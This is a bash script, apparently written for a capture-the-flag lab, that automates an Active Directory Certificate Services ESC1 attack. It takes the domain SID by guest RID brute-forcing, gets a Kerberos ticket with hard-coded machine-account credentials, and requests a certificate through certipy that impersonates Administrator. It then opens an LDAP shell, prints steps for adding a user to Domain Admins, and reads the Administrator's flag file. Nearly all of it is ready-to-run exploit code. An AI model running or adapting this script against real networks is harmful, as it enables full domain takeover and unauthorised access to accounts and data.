#!/bin/bash
# ad-esc1.sh - ADCS ESC1 attack
# Usage: ./ad-esc1.sh <domain> <dc-ip> <machine_user> <machine_pass> <ca> <template> <target_user>
# Example: ./ad-esc1.sh retro.vl 10.129.234.44 BANKING\$ banking retro-DC-CA RetroClients Administrator

DOMAIN="${1:-retro.vl}"
DC_IP="${2:-10.129.234.44}"
MACHINE_USER="${3:-BANKING\$}"
MACHINE_PASS="${4:-banking}"
CA="${5:-retro-DC-CA}"
TEMPLATE="${6:-RetroClients}"
TARGET_USER="${7:-Administrator}"
VENV="/Users/gluppler/Downloads/CTFs-Testing/Pro-Labs/.venv313/bin"

echo "=== ADCS ESC1 ATTACK ==="
echo "Machine: $MACHINE_USER / CA: $CA / Template: $TEMPLATE"
echo ""

# Step 1: Find domain SID
echo "[1] Getting domain SID..."
DOMAIN_SID=$($VENV/nxc smb "$DOMAIN" -u Guest -p "" --rid-brute 500 2>/dev/null | grep "Administrator" | grep -oP 'S-1-5-21-\d+-\d+-\d+' | head -1)
# Fallback: use nxc ldap
if [ -z "$DOMAIN_SID" ]; then
    DOMAIN_SID=$($VENV/nxc ldap "$DC_IP" -u Guest -p "" --query "(sAMAccountName=Administrator)" --attrs objectSid 2>/dev/null | grep -oP 'S-1-5-21-\d+-\d+-\d+' | head -1)
fi
ADMIN_SID="${DOMAIN_SID}-500"
echo "Administrator SID: $ADMIN_SID"

# Step 2: Get TGT for machine account
echo "[2] Getting Kerberos TGT..."
cd "$(dirname "$0")/../../Retro" 2>/dev/null || cd /tmp
$VENV/python3 /Users/gluppler/Downloads/CTFs-Testing/Pro-Labs/Puppet/venv/bin/getTGT.py "$DOMAIN/${MACHINE_USER}:${MACHINE_PASS}" -dc-ip "$DC_IP" 2>/dev/null

# Step 3: Request certificate as target user
echo "[3] Requesting certificate..."
KRB5CCNAME="$(ls -t BANKING\$*.ccache 2>/dev/null | head -1)"
if [ -z "$KRB5CCNAME" ]; then
    echo "[-] TGT file not found. Trying password-based cert request..."
    $VENV/certipy req -u "${MACHINE_USER}@${DOMAIN}" -p "$MACHINE_PASS" -dc-ip "$DC_IP" \
        -ca "$CA" -template "$TEMPLATE" \
        -upn "$TARGET_USER" -target "${DC_IP}" -key-size 4096 \
        -sid "$ADMIN_SID" 2>&1
else
    echo "[+] Using TGT: $KRB5CCNAME"
    export KRB5CCNAME="$PWD/$KRB5CCNAME"
    $VENV/certipy req -u "${MACHINE_USER}@${DOMAIN}" -k -no-pass -dc-ip "$DC_IP" \
        -ca "$CA" -template "$TEMPLATE" \
        -upn "$TARGET_USER" -target "$DOMAIN" -target-ip "$DC_IP" \
        -ns "$DC_IP" -dns-tcp -key-size 4096 \
        -sid "$ADMIN_SID" 2>&1
fi

# Step 4: Use certificate for LDAP shell
echo "[4] LDAP shell as $TARGET_USER..."
PFX="$(ls -t *.pfx 2>/dev/null | head -1)"
if [ -n "$PFX" ]; then
    echo "[+] Certificate: $PFX"
    echo "[*] Running LDAP shell - use add_user_to_group to escalate:"
    echo "    add_user_to_group <your_user> 'Domain Admins'"
    $VENV/certipy auth -pfx "$PFX" -username "$TARGET_USER" -domain "$DOMAIN" \
        -dc-ip "$DC_IP" -ldap-shell 2>&1
else
    echo "[-] No PFX file found"
fi

echo ""
echo "=== Done ==="
echo "After adding user to Domain Admins, use:"
echo "  nxc smb $DOMAIN -u <user> -p <pass> -x 'type C:\\Users\\Administrator\\Desktop\\root.txt'"
